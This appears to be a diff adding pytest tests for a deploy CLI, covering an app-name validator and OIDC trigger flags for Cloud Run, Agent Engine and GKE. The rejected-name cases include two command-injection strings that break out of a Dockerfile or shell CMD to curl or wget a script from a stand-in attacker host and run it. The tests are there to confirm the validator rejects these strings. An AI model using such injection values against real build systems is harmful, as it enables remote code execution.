@@ -508,6 +508,214 @@ def test_to_gke_uses_gcloud_cmd_on_windows(
 
 
 # _validate_agent_import tests
+class TestValidateAppName:
+  """Tests for the _validate_app_name function and its deploy call sites."""
+
+  @pytest.mark.parametrize(
+      "app_name",
+      [
+          "ssr",
+          "my-agent",
+          "my_agent",
+          "agent2",
+          "A",
+          "a" * 63,
+          "my.agent",
+          "agent.v1",
+          "agent-1.0",
+          "agent_v1.0",
+          "_agent.1",
+          "-agent.1",
+          "v1.0.0",
+      ],
+  )
+  def test_accepts_plain_identifiers(self, app_name: str) -> None:
+    # Should not raise.
+    cli_deploy._validate_app_name(app_name)
+
+  @pytest.mark.parametrize(
+      "app_name",
+      [
+          # Breaks out of a Dockerfile instruction.
+          'myagent"\nRUN curl https://attacker.example/x.sh | sh\n#',
+          # Breaks out of the shell-form CMD.
+          "x ; wget http://attacker/c2 -O /tmp/c2 ; sh /tmp/c2 #",
+          # Quotes and spaces.
+          'a" "b',
+          "has space",
+          # Trailing newline (would pass regex $ without fullmatch).
+          "myagent\n",
+          # Empty and over-long.
+          "",
+          "a" * 64,
+          # Path traversal shape and dot-only/dot-prefix names.
+          "../evil",
+          ".",
+          "..",
+          ".git",
+      ],
+  )
+  def test_rejects_unsafe_names(self, app_name: str) -> None:
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy._validate_app_name(app_name)
+    assert "Invalid app name" in str(exc_info.value)
+
+  def test_to_cloud_run_validates_app_name_and_trailing_slash(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      agent_dir: Callable[[bool, bool], Path],
+      tmp_path: Path,
+  ) -> None:
+    src_dir = agent_dir(False, False)
+    monkeypatch.setattr(subprocess, "run", lambda *a, **k: None)
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_cloud_run(
+          agent_folder=str(src_dir),
+          project="proj",
+          region="us-central1",
+          service_name="svc",
+          app_name='myagent"\nRUN injection',
+          temp_folder=str(tmp_path),
+          port=8080,
+          trace_to_cloud=False,
+          otel_to_cloud=False,
+          with_ui=False,
+          log_level="info",
+          verbosity="info",
+          adk_version="1.3.0",
+      )
+    assert "Invalid app name" in str(exc_info.value)
+
+    # Trailing slash in agent_folder should resolve to valid app_name when app_name is empty.
+    cli_deploy.to_cloud_run(
+        agent_folder=str(src_dir) + "/",
+        project="proj",
+        region="us-central1",
+        service_name="svc",
+        app_name="",
+        temp_folder=str(tmp_path),
+        port=8080,
+        trace_to_cloud=False,
+        otel_to_cloud=False,
+        with_ui=False,
+        log_level="info",
+        verbosity="info",
+        adk_version="1.3.0",
+    )
+
+  def test_to_agent_engine_validates_app_name_and_trailing_slash(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      tmp_path: Path,
+  ) -> None:
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+    fake_vertexai = types.ModuleType("vertexai")
+
+    class _FakeAgentEngines:
+
+      def create(self, **kwargs: Any) -> Any:
+        return types.SimpleNamespace(
+            api_resource=types.SimpleNamespace(
+                name="projects/p/locations/l/reasoningEngines/e"
+            )
+        )
+
+      def update(self, *, name: str, config: Dict[str, Any]) -> None:
+        del name
+        del config
+
+    class _FakeVertexClient:
+
+      def __init__(self, *args: Any, **kwargs: Any) -> None:
+        self.agent_engines = _FakeAgentEngines()
+
+    fake_vertexai.Client = _FakeVertexClient
+    monkeypatch.setitem(sys.modules, "vertexai", fake_vertexai)
+
+    # Invalid folder name with space should fail validation.
+    invalid_dir = tmp_path / "invalid name"
+    invalid_dir.mkdir()
+    (invalid_dir / "agent.py").write_text("root_agent = 'dummy'\n")
+    (invalid_dir / "__init__.py").touch()
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_agent_engine(
+          agent_folder=str(invalid_dir),
+          temp_folder="tmp",
+          project="my-gcp-project",
+          region="us-central1",
+          adk_version="1.2.0",
+      )
+    assert "Invalid app name" in str(exc_info.value)
+
+    # Folder name with dots and trailing slash should succeed.
+    dotted_dir = tmp_path / "my.agent"
+    dotted_dir.mkdir()
+    (dotted_dir / "agent.py").write_text("root_agent = 'dummy'\n")
+    (dotted_dir / "__init__.py").touch()
+
+    cli_deploy.to_agent_engine(
+        agent_folder=str(dotted_dir) + "/",
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version="1.2.0",
+    )
+
+  def test_to_gke_validates_app_name_and_trailing_slash(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      agent_dir: Callable[[bool, bool], Path],
+      tmp_path: Path,
+  ) -> None:
+    src_dir = agent_dir(False, False)
+    monkeypatch.setattr(
+        subprocess,
+        "run",
+        lambda *a, **k: types.SimpleNamespace(
+            stdout="deployment created\nservice created"
+        ),
+    )
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_gke(
+          agent_folder=str(src_dir),
+          project="gke-proj",
+          region="us-east1",
+          cluster_name="my-gke-cluster",
+          service_name="gke-svc",
+          app_name="invalid name",
+          temp_folder=str(tmp_path),
+          port=9090,
+          trace_to_cloud=False,
+          otel_to_cloud=False,
+          with_ui=False,
+          log_level="debug",
+          adk_version="1.2.0",
+      )
+    assert "Invalid app name" in str(exc_info.value)
+
+    # Trailing slash in agent_folder should resolve to valid app_name when app_name is empty.
+    cli_deploy.to_gke(
+        agent_folder=str(src_dir) + "/",
+        project="gke-proj",
+        region="us-east1",
+        cluster_name="my-gke-cluster",
+        service_name="gke-svc",
+        app_name="",
+        temp_folder=str(tmp_path),
+        port=9090,
+        trace_to_cloud=False,
+        otel_to_cloud=False,
+        with_ui=False,
+        log_level="debug",
+        adk_version="1.2.0",
+    )
+
+
 class TestValidateAgentImport:
   """Tests for the _validate_agent_import function."""
 
@@ -730,6 +938,102 @@ def test_cli_deploy_agent_engine_trigger_sources(tmp_path: Path):
     mock_to_agent_engine.assert_called_once()
     _, kwargs = mock_to_agent_engine.call_args
     assert kwargs["trigger_sources"] == "pubsub,eventarc"
+
+
+def test_cli_deploy_agent_engine_trigger_oidc_options(tmp_path: Path):
+  """Tests that OIDC flags are passed to to_agent_engine."""
+  agent_dir = tmp_path / "my_agent"
+  agent_dir.mkdir()
+  runner = CliRunner()
+  with mock.patch(
+      "src.google.adk.cli.cli_deploy.to_agent_engine"
+  ) as mock_to_agent_engine:
+    result = runner.invoke(
+        cli_tools_click.main,
+        [
+            "deploy",
+            "agent_engine",
+            "--trigger_sources=pubsub",
+            "--trigger_oidc_audience=https://my-service.run.app",
+            "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com",
+            str(agent_dir),
+        ],
+        catch_exceptions=False,
+    )
+    assert result.exit_code == 0
+    mock_to_agent_engine.assert_called_once()
+    _, kwargs = mock_to_agent_engine.call_args
+    assert kwargs["trigger_sources"] == "pubsub"
+    assert kwargs["trigger_oidc_audience"] == "https://my-service.run.app"
+    assert (
+        kwargs["trigger_oidc_service_accounts"]
+        == "sa@project.iam.gserviceaccount.com"
+    )
+
+
+def test_cli_deploy_cloud_run_trigger_oidc_options(tmp_path: Path):
+  """Tests that OIDC flags are passed to to_cloud_run."""
+  agent_dir = tmp_path / "my_agent"
+  agent_dir.mkdir()
+  runner = CliRunner()
+  with mock.patch(
+      "src.google.adk.cli.cli_deploy.to_cloud_run"
+  ) as mock_to_cloud_run:
+    result = runner.invoke(
+        cli_tools_click.main,
+        [
+            "deploy",
+            "cloud_run",
+            "--project=my-project",
+            "--region=us-central1",
+            "--trigger_sources=pubsub,eventarc",
+            "--trigger_oidc_audience=https://my-service.run.app",
+            "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com",
+            str(agent_dir),
+        ],
+        catch_exceptions=False,
+    )
+    assert result.exit_code == 0
+    mock_to_cloud_run.assert_called_once()
+    _, kwargs = mock_to_cloud_run.call_args
+    assert kwargs["trigger_sources"] == "pubsub,eventarc"
+    assert kwargs["trigger_oidc_audience"] == "https://my-service.run.app"
+    assert (
+        kwargs["trigger_oidc_service_accounts"]
+        == "sa@project.iam.gserviceaccount.com"
+    )
+
+
+def test_cli_deploy_gke_trigger_oidc_options(tmp_path: Path):
+  """Tests that OIDC flags are passed to to_gke."""
+  agent_dir = tmp_path / "my_agent"
+  agent_dir.mkdir()
+  runner = CliRunner()
+  with mock.patch("src.google.adk.cli.cli_deploy.to_gke") as mock_to_gke:
+    result = runner.invoke(
+        cli_tools_click.main,
+        [
+            "deploy",
+            "gke",
+            "--project=my-project",
+            "--region=us-central1",
+            "--cluster_name=my-cluster",
+            "--trigger_sources=pubsub,eventarc",
+            "--trigger_oidc_audience=https://my-service.run.app",
+            "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com",
+            str(agent_dir),
+        ],
+        catch_exceptions=False,
+    )
+    assert result.exit_code == 0
+    mock_to_gke.assert_called_once()
+    _, kwargs = mock_to_gke.call_args
+    assert kwargs["trigger_sources"] == "pubsub,eventarc"
+    assert kwargs["trigger_oidc_audience"] == "https://my-service.run.app"
+    assert (
+        kwargs["trigger_oidc_service_accounts"]
+        == "sa@project.iam.gserviceaccount.com"
+    )
 
 
 def test_cli_deploy_agent_engine_artifact_service_uri(tmp_path: Path):
@@ -1176,6 +1480,92 @@ def test_to_agent_engine_extra_packages_requirements_txt_is_not_clobbered(
   )
   assert (tmp_dir / "requirements.txt").read_text() == (
       "some-unrelated-package\n"
+  )
+
+
+def test_to_cloud_run_dockerfile_trigger_oidc_options(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """to_cloud_run includes trigger OIDC options in the generated Dockerfile CMD."""
+  src_dir = agent_dir(False, False)
+  temp_dir = tmp_path / "cloud_run_temp"
+  monkeypatch.setattr(
+      subprocess, "run", lambda *a, **k: mock.MagicMock(returncode=0)
+  )
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+  cli_deploy.to_cloud_run(
+      agent_folder=str(src_dir),
+      temp_folder=str(temp_dir),
+      project="my-project",
+      region="us-central1",
+      service_name="my-service",
+      app_name="my-app",
+      port=8000,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      adk_version="1.2.0",
+      log_level="INFO",
+      verbosity="INFO",
+      trigger_sources="pubsub,eventarc",
+      trigger_oidc_audience="https://my-service.run.app",
+      trigger_oidc_service_accounts="sa@project.iam.gserviceaccount.com",
+  )
+
+  dockerfile_content = (temp_dir / "Dockerfile").read_text()
+  assert "--trigger_sources=pubsub,eventarc" in dockerfile_content
+  assert (
+      "--trigger_oidc_audience=https://my-service.run.app" in dockerfile_content
+  )
+  assert (
+      "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com"
+      in dockerfile_content
+  )
+
+
+def test_to_gke_dockerfile_trigger_oidc_options(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """to_gke includes trigger OIDC options in the generated Dockerfile CMD."""
+  src_dir = agent_dir(False, False)
+  temp_dir = tmp_path / "gke_temp"
+  monkeypatch.setattr(
+      subprocess, "run", lambda *a, **k: mock.MagicMock(returncode=0)
+  )
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+  cli_deploy.to_gke(
+      agent_folder=str(src_dir),
+      temp_folder=str(temp_dir),
+      project="my-project",
+      region="us-central1",
+      cluster_name="my-cluster",
+      service_name="my-service",
+      app_name="my-app",
+      port=8000,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      adk_version="1.2.0",
+      log_level="INFO",
+      trigger_sources="pubsub,eventarc",
+      trigger_oidc_audience="https://my-service.run.app",
+      trigger_oidc_service_accounts="sa@project.iam.gserviceaccount.com",
+  )
+
+  dockerfile_content = (temp_dir / "Dockerfile").read_text()
+  assert "--trigger_sources=pubsub,eventarc" in dockerfile_content
+  assert (
+      "--trigger_oidc_audience=https://my-service.run.app" in dockerfile_content
+  )
+  assert (
+      "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com"
+      in dockerfile_content
   )
 
 
